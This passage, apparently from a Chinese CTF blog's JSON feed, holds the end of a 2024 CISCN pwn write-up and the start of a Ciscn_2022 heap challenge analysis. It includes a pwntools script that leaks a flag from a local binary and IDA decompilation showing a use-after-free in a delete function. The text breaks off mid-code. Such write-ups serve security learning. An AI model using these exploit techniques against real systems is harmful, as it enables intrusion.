punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"pwn_2\"><a class=\"markdownIt-Anchor\" href=\"#pwn_2\">#</a> pwn_2</h3>\n<blockquote>\n<p>不得不说，去符号表属实难看。唉，怪我忘记恢复符号表了，rizz 的恢复符号表的效果一言难尽。</p>\n</blockquote>\n<blockquote>\n<p>在这里特别感谢 eastXueLia 师傅，浇我使用 flare 恢复符号表。以前恢复符号表各种碰壁，终于有一个可以恢复符号表特别有用的方式了！</p>\n</blockquote>\n<h5 id=\"fix-2\"><a class=\"markdownIt-Anchor\" href=\"#fix-2\">#</a> fix</h5>\n<p>利用 flare 恢复符号表之后</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625201547611.png\" alt=\"image-20240625201547611\"></p>\n<p>在这里将 /flag 名字改一下，就能防御成功。</p>\n<h5 id=\"break-2\"><a class=\"markdownIt-Anchor\" href=\"#break-2\">#</a> break</h5>\n<p>add</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202729350.png\" alt=\"image-20240625202729350\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202747051.png\" alt=\"image-20240625202747051\"></p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202802852.png\" alt=\"image-20240625202802852\"></p>\n<p>分配一个空间，并向其写入 8 字节大小的数据</p>\n<p>check</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211015394.png\" alt=\"image-20240625211015394\"></p>\n<p>在这里会把 flag 读入一个位置。</p>\n<p>get</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211231319.png\" alt=\"image-20240625211231319\"></p>\n<p>这里可以完成 flag 的泄露</p>\n<p>只要找到将 flag 写入内存内，并找到，使用 get 即可找到 flag (本地测试是这样，远程应该还会出啥幺蛾子吧)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lss     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> s                  <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;31;40m%s --> 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>1: ls flag</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>2: add flag</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>3: edit flag</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>4: del flag</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>5: get flag</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>6: check flag</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">0x4ef784</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x4efaf0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'6: check flag\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211439570.png\" alt=\"image-20240625211439570\"></p>\n<p>粘几篇 blog 吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkwNjUzMy9hcnRpY2xlL2RldGFpbHMvMTM5OTM3Mjg4P2NzZG5fc2hhcmVfdGFpbD0lN0IlMjJ0eXBlJTIyJTNBJTIyYmxvZyUyMiUyQyUyMnJUeXBlJTIyJTNBJTIyYXJ0aWNsZSUyMiUyQyUyMnJJZCUyMiUzQSUyMjEzOTkzNzI4OCUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMndlaXhpbl80NTkwNjUzMyUyMiU3RA==\">2024 CISCN 华东北分区赛 - Ahisec-CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk5MzAwMDA=\">2024 全国大学生信息安全竞赛（ciscn）半决赛华东北赛区 Pwn 题解 - CSDN 博客</span></p>\n",
            "tags": [
                "栈",
                "shellcode",
                "rw"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/21/Ciscn-2022-blue/",
            "url": "https://yhuanhuan01.github.io/2024/06/21/Ciscn-2022-blue/",
            "title": "Ciscn_2022_blue",
            "date_published": "2024-06-21T08:46:04.000Z",
            "content_html": "<h1 id=\"ciscn_2022-blue\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-blue\">#</a> Ciscn_2022 blue</h1>\n<blockquote>\n<p>前言：一道 2.31 的 glibc 堆题（国赛将至，复现一下吧</p>\n</blockquote>\n<h2 id=\"了解程序\"><a class=\"markdownIt-Anchor\" href=\"#了解程序\">#</a> 了解程序</h2>\n<p>首先需要检查程序保护</p>\n<h3 id=\"保护全开\"><a class=\"markdownIt-Anchor\" href=\"#保护全开\">#</a> 保护全开</h3>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621141324623.png\" alt=\"image-20240621141324623\"></p>\n<p>Ida 分析一下程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">sub_1730</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">sub_18D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 菜单，无 edit</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//str_2_int</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">sub_14C5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//show</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">sub_138A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//add</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">sub_1592</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//dele 无 UAF</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"sub_1730开启沙盒\"><a class=\"markdownIt-Anchor\" href=\"#sub_1730开启沙盒\">#</a> sub_1730 (开启沙盒)</h3>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621141506838.png\" alt=\"image-20240621141506838\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_4070 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 只能使用一次这个函数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 存在 UAF</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">++</span>dword_4070<span class=\"token punctuation\">;</span><span class=\"token comment\">//delete_count</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DONE!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_406C <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 同样只能 show 一次</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">++</span>dword_406C<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token 